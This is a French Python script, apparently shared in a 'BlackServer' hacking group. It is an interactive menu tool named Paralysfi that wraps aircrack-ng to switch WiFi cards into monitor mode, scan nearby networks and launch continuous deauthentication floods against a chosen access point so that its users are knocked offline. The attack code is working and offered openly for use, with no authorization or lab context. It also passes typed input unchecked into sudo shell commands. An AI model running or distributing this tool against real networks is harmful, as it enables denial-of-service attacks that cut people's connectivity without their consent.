# -*- coding: utf8 -*-

#############################################################################################################
#############################################################################################################
## Merci d'avoir télécharger mon programme : Paralysfi ;) !
## Je l'ai créée juste pour patienter le temps que je dev un autre 
##
## J'espere qu'il vous plaira ! :)
## Donnez moi vos avis sur le Black Server
##
## Important !! : Pour que le crack puisse fonctionner, assurez-vous d'avoir une clée WiFi qui gére les attaques 
## et puisse passer en mode Monitor (Référence : Une carte Wi-Fi compatible 802.11) 
## (ex: Alfa_Awus, TP-Link_wn722n)
##
## ici quelques liens amazon pour en trouver :
## - TP-Link: https://goo.gl/RyykF9
## - Alfa_Awus: https://goo.gl/YjRkaa
############################################################################################################
############################################################################################################

import os
import subprocess
from time import sleep

###################
##Le Core :
###################

#Les couleurs :
class c:
    VIOLET = '\033[95m'
    CYAN = '\033[96m'
    CYANSOMBRE = '\033[36m'
    BLEU = '\033[94m'
    VERT = '\033[92m'
    JAUNE = '\033[93m'
    ROUGE = '\033[91m'
    GRAS = '\033[1m'
    SOUSLIGNE = '\033[4m'
    FIN = '\033[0m'

#Le Header ;
def header():
    print ("")
    print (c.BLEU + c.GRAS + """
	█████╗  █████╗ ██████╗  █████╗ ██╗  ██╗   ██╗███████╗███████╗██╗
	██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║  ╚██╗ ██╔╝██╔════╝██╔════╝██║
	██████╔╝███████║██████╔╝███████║██║   ╚████╔╝ ███████╗█████╗  ██║
	██╔═══╝ ██╔══██║██╔══██╗██╔══██║██║    ╚██╔╝  ╚════██║██╔══╝  ██║
	██║     ██║  ██║██║  ██║██║  ██║███████╗██║   ███████║██║     ██║
	╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚══════╝╚═╝     ╚═╝
        
        """ + c.FIN)
    print ("")

#Les Quotes :
def quotes():
    print ("")
    print ("\t-*-=[" + c.JAUNE + "Auteur : " + c.GRAS + c.ROUGE + "1CE#6297" + c.FIN)
    print ("\t\t\t-****-=[" + c.JAUNE + "Outil réserver pour les membres du " + c.GRAS + c.ROUGE + "BlackServer" + c.FIN)
    print ("\t-***-=[" + c.JAUNE + "Version : " + c.GRAS + c.ROUGE + "1.0.1 \n" + c.FIN)

def thankful():
	print (c.VIOLET + "-----------" + c.FIN)  
	print("""
 Merci d'avoir télécharger mon programme : """ + c.ROUGE + """ Paralysfi """ + c.FIN + """;) !
 Je l'ai créée juste pour patienter le temps que je dev un autre 

 J'espere qu'il vous plaira ! :)
 Donnez moi vos avis sur le Black Server
""")
	print (c.VIOLET + "-----------" + c.FIN)  

#Le Menu : 
def menu():
    print (c.VIOLET + "-----------" + c.FIN)
    print ("1." + c.CYANSOMBRE + c.GRAS + " Afficher ifconfig" + c.FIN)
    print ("2." + c.CYANSOMBRE + c.GRAS + " Afficher vos interfaces" + c.FIN)
    print ("3." + c.CYANSOMBRE + c.GRAS + " Passer Wlan0 en mode Monitor" + c.FIN)
    print ("4." + c.CYANSOMBRE + c.GRAS + " Passer Wlan1 en mode Monitor" + c.FIN)
    print (c.VIOLET + "-----------" + c.FIN)  
    print ("5." + c.CYANSOMBRE + c.GRAS + " Paralyser un WiFi (Deauth)" + c.FIN)
    print (c.VIOLET + "-----------" + c.FIN)
    print ("6." + c.CYANSOMBRE + c.GRAS + " Passer Wlan0mon en mode Manager" + c.FIN)
    print ("7." + c.CYANSOMBRE + c.GRAS + " Passer Wlan1mon en mode Manager" + c.FIN)
    print ("i." + c.CYANSOMBRE + c.GRAS + " Installer les tools requis" + c.FIN)
    print ("h." + c.CYANSOMBRE + c.GRAS + " Afficher le Help" + c.FIN)
    print ("0." + c.CYANSOMBRE + c.GRAS + " Exit" + c.FIN)
    print (c.VIOLET + "-----------\n" + c.FIN)
    print (""" Important !! : Pour que le crack puisse fonctionner, assurez-vous d'avoir une clée WiFi qui gére les attaques 
 et puisse passer en mode Monitor (Référence : Une carte Wi-Fi compatible 802.11) 
 (ex: Alfa_Awus, TP-Link_wn722n)

 ici quelques liens amazon pour en trouver :
 - TP-Link: https://goo.gl/RyykF9
 - Alfa_Awus: https://goo.gl/YjRkaa """)

#Le Module 1 : 
def show_ifconfig():
		os.system("ifconfig")

#Le Module 2 : 
def show_interface():
		os.system("airmon-ng")

#Le Module 3 :
def fire_wlan0():
		os.system("airmon-ng start wlan0") + os.system("airmon-ng check kill")

#Le Module 3 :
def fire_wlan1():
		os.system("airmon-ng start wlan1") + os.system("airmon-ng check kill")

#Ask Deauth :
def askDeauth():
	ask1 = input(" Voulez-vous afficher tout les WiFi ? [Y/n] ")
	if ask1 == "Y" :
		ask2 = input(" Votre interface : [wlan0mon/wlan1mon]")
		os.system("sudo airodump-ng " + ask2)
		print("Pensez a copier coller la ligne du WiFi souhaiter")
	elif ask1 == "" :
		ask2 = input(" Votre interface : [wlan0mon/wlan1mon]")
		os.system("sudo airodump-ng " + ask2)
		print("Pensez a copier coller la ligne du WiFi souhaiter")
	elif ask1 == "y" :
		ask2 = input(" Votre interface : [wlan0mon/wlan1mon]")
		os.system("sudo airodump-ng " + ask2)
		print("Pensez a copier coller la ligne du WiFi souhaiter")
	else : 
		deauth_wifi()

#Install Requierd 
def installRequ():
	ask1 = input("Voulez-vous installer tout les tools requis ?")
	if ask1 == "Y":
		os.system("apt-get install aircrack-ng")
		print("Tout est installer ! Retour au menu")
	elif ask1 == "":
		os.system("apt-get install aircrack-ng")
		print("Tout est installer ! Retour au menu")
	elif ask1 == "Y":
		os.system("apt-get install aircrack-ng")
		print("Tout est installer ! Retour au menu")
	else : 
		print("Retour au menu")

#Le Module Wlan0monDown :
def wlan0_down():
	os.system("airmon-ng stop wlan0mon")

#Le Module Wlan0monDown :
def wlan1_down():
	os.system("airmon-ng stop wlan1mon")


#Le Deauth :
def deauth_wifi():
	ligne = c.ROUGE + c.GRAS + "ezc" + c.FIN
	ligne += ":"
	ligne += c.JAUNE + c.GRAS + "deauth" + c.FIN
	ligne += " -> "
	cmd0 = input(ligne + c.GRAS + "Bssid [addr mac ap] : " + c.FIN)
	cmd1 = input(ligne + c.GRAS + "Channel [CH] : " +c.FIN)
	cmd2 = input(ligne + c.GRAS + "Interface [Default : wlan0mon] : " + c.FIN)
	if cmd2 == "":
		cmd2 = "wlan0mon"
	x0 = ("sudo xterm -e airodump-ng -c " + cmd1 + " --bssid " + cmd0 + " " + cmd2 + " &")
	os.system(x0)
	x1 = ("sudo xterm -e aireplay-ng -0 0 -a " + cmd0 + " " + cmd2 + " &")
	sleep(2)
	os.system(x1)
	sleep(1)
	os.system(x1)
	sleep(1)
	os.system(x1)

#Le Go Back :
def goback():
	print ("\n------")
	bck = input(c.GRAS + "Go Back " + c.FIN + "(" + c.ROUGE + "Y" + c.FIN + "): ")
	if bck == "Y":
		print ("\n\n\n\n\n\n\n\n")
		header()
		quotes()
		menu()
		main()
	elif bck == "y":
		print ("\n\n\n\n\n\n\n\n")
		header()
		quotes()
		menu()
		main()
	elif bck == "":
		print ("\n\n\n\n\n\n\n\n")
		header()
		quotes()
		menu()
		main()
	else :
		print ("\n\n\n\n\n\n\n\n")
		header()
		quotes()
		menu()
		main()
##################


#Le CTRLC :
def exitc():
	ask1 = input(c.JAUNE + "[?]" + c.FIN + " Voulez-vous éteindre votre interface en partant ? [Y/n] ")
	if ask1 == "" :
		ask2 = input(c.JAUNE + "[?]" + c.FIN + "Saisissez votre interface : [W0/w1] (Default Wlan0mon) ")
		if ask2 == "":
			os.system("airmon-ng stop wlan0mon")
		elif ask2 == "W0":
			os.system("airmon-ng stop wlan0mon")
		elif ask2 == "w0":
			os.system("airmon-ng stop wlan0mon")
		elif ask2 == "w1":
			os.system("airmon-ng stop wlan1mon")
		elif ask2 == "W1":
			os.system("airmon-ng stop wlan1mon")

	elif ask1 == "Y":
		ask2 = input(c.JAUNE + "[?]" + c.FIN + "Saisissez votre interface : [W0/w1] (Default Wlan0mon) ")
		if ask2 == "":
			os.system("airmon-ng stop wlan0mon")
		elif ask2 == "W0":
			os.system("airmon-ng stop wlan0mon")
		elif ask2 == "w0":
			os.system("airmon-ng stop wlan0mon")
		elif ask2 == "w1":
			os.system("airmon-ng stop wlan1mon")
		elif ask2 == "W1":
			os.system("airmon-ng stop wlan1mon")

	elif ask1 == "y":
		ask2 = input(c.JAUNE + "[?]" + c.FIN + "Saisissez votre interface : [W0/w1] (Default Wlan0mon) ")
		if ask2 == "":
			os.system("airmon-ng stop wlan0mon")
		elif ask2 == "W0":
			os.system("airmon-ng stop wlan0mon")
		elif ask2 == "w0":
			os.system("airmon-ng stop wlan0mon")
		elif ask2 == "w1":
			os.system("airmon-ng stop wlan1mon")
		elif ask2 == "W1":
			os.system("airmon-ng stop wlan1mon")
	else:
		print("Have Nice Hack-Day ;)")


###############################

############
##Le Code :
############
def main():

	try:
		ligne = c.ROUGE + c.GRAS + "ezc" + c.FIN
		ligne += " -> "				#Ceci est la ligne qui sert a entrer les commandes
		console = input(ligne)

		if console == "1" :
			show_ifconfig()
			goback()

		if console == "2" :
			show_interface()
			goback()

		if console == "3":
			fire_wlan0()
			goback()

		if console == "4":
			fire_wlan1()
			goback()

		if console == "5":
			askDeauth()
			deauth_wifi()
			goback()

		if console == "6":
			wlan0_down()
			goback()

		if console == "7":
			wlan1_down()
			goback()

		if console == "h":
			thankful()
			goback()

		if console == "i":
			installRequ()
			goback()

		if console == "0":
			exitc()

	except(KeyboardInterrupt):
		print(c.ROUGE + "[!]" + c.FIN + " Vous allez quitter le programme.")
		exitc()


			


def start(): #Ceci est l'ouverture du programme 
	header()
	quotes()
	menu()
	main()
if __name__ == '__main__':
	start()
